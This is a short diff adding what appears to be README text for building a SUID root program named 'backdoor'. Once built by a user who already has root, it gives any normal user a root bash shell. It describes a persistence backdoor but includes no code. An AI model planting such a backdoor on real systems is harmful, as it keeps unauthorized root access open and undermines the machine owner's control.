@@ -1,0 +1,4 @@
+To build, you must already have root on the machine.
+Run 'buildbot' as root, and the SUID root program 'backdoor' will be
+created in this directory. Then, simply run 'backdoor' as a normal user
+and it will bring you into a root bash shell.
